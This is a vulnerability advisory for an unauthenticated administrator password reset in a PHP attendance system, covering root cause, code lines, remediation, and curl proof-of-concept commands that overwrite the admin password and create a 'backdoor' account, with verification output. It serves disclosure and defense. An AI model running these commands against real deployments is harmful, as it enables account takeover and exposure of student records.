# VULN-01 — Unauthenticated Administrative Password Reset / Account Takeover (reset_password.php)

> **Audit by:** EVA Security Research
> **Product:** Smart Attendance System with QR Code Scanner (SourceCodester #18702), v1.0 — PHP/MySQL (PDO), developer Gon13
> **Audit date:** 2026-10-17 | **Verification:** local deployment, PHP 7.3.4 + MySQL 5.7.26

## 1. Vulnerability Overview / Summary
The maintenance script reset_password.php performs a password change for any user account (and creates an account if the username is unknown) without requiring any authentication or session. An unauthenticated remote attacker can overwrite the administrator password and take over the admin panel, or create an arbitrary new administrative account.

## 2. Affected Component & Version
- **Component:** `reset_password.php (lines 2-41; password update logic lines 8-41, output line 61)`
- **Product:** Smart Attendance System with QR Code Scanner (SourceCodester #18702), v1.0. No patched version exists.

## 3. Vulnerability Type & Risk Level
- **Class (VulDB):** Missing Authentication for Critical Function
- **CWE-306: Missing Authentication for Critical Function**
- **Severity:** Critical
- **CVSS 3.1 vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` — **9.1**

## 4. Vulnerability Location (file:line)
```php
// reset_password.php
require 'includes/db.php';          // line 4 - NO includes/auth.php, no session check

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = trim($_POST['username']);        // line 9  attacker-controlled
    $new_password = trim($_POST['password']);    // line 10 attacker-controlled
    ...
        $update = $pdo->prepare("UPDATE users SET password = ? WHERE username = ?");  // line 23
        if ($update->execute([$hash, $username])) {                                    // line 24
            $message = "Success! Password for user '<strong>$username</strong>' has been updated."; // line 25
    ...
        } else {
            // Create new user if not exists (Safety net)                              // line 30
            $insert = $pdo->prepare("INSERT INTO users (username, password) VALUES (?, ?)"); // line 31
```

## 5. Root Cause Analysis
The developer shipped a browser-accessible password-reset utility (documented on the SourceCodester project page as a file to delete before production) inside the web root with no authentication gate. Every other admin page includes includes/auth.php which enforces the session; reset_password.php does not. The endpoint is a state-changing POST handler reachable by anyone.

## 6. Preconditions
None. Network access to the application. No account, no session, no user interaction required.

## 7. Reproduction Steps
1. Deploy the application with default settings (htdocs/smart_attendance).
2. Send an unauthenticated POST to reset_password.php with the admin username and a new password.
3. Log in at login.php with the new password - full administrative access is obtained.
4. (Alternative) POST an unknown username to have the application create a new account with the attacker's password.

## 8. PoC / EXP
```bash
# 1) Unauthenticated password overwrite of the admin account
curl -s -X POST "http://<TARGET>/reset_password.php" --data "username=admin&password=AttackerSetPass123"

# 2) Login with the attacker-set password -> admin dashboard
curl -s -c jar.txt -X POST "http://<TARGET>/login.php" --data "username=admin&password=AttackerSetPass123"
curl -s -b jar.txt "http://<TARGET>/index.php"   # 200 - Dashboard

# 3) Unauthenticated creation of an arbitrary account
curl -s -X POST "http://<TARGET>/reset_password.php" --data "username=backdoor&password=backdoor123"
```

## 9. Verification Results
Executed against a local deployment (127.0.0.1):

  POST /smart_attendance/reset_password.php  (no cookie)
  body: username=admin&password=PwnedByAudit2026
  resp: "Success! Password for user 'admin' has been updated."

  POST /login.php username=admin&password=PwnedByAudit2026
  -> 302 Location: index.php ; GET /index.php (with session) -> 200, Dashboard rendered

  POST /reset_password.php username=backdoor&password=backdoor123  (no cookie)
  resp: "User 'backdoor' was not found, so a NEW account was created with this password."

Both the password overwrite and the unauthenticated account creation were confirmed end-to-end, followed by a successful administrative login.

## 10. Impact
Complete takeover of the application: the attacker becomes administrator (or creates a new admin account) and can read/modify/delete all student records, attendance logs, class schedules and user accounts. Because the endpoint is unauthenticated, the attack is scriptable and leaves only a normal-looking password change in logs. The same defect also allows denial of service by resetting the legitimate admin's password.

## 11. Remediation
```php
<?php
// Option A (recommended): remove the file from the web root entirely.
// Option B: require an authenticated administrator session:
require 'includes/auth.php';               // session gate
// plus: require the current password before allowing a change
if (!password_verify($_POST['current_password'] ?? '', $currentUser['password'])) {
    http_response_code(403); exit;
}
// and never auto-create accounts in a reset flow.
```
- Delete `reset_password.php` and `create_admin.php` from any deployment (the developer's own page instructs this, but the files ship enabled).
- Add an `.htaccess`/server rule denying HTTP access to maintenance scripts.

## 12. References & Timeline
- **Audit by:** EVA Security Research
- **Identification:** 2026-10-17
- **Vendor notification:** not yet sent (SourceCodester is a distribution portal; no vendor patch process exists)
- **CVE:** TBD (submission package for the VulDB workflow)
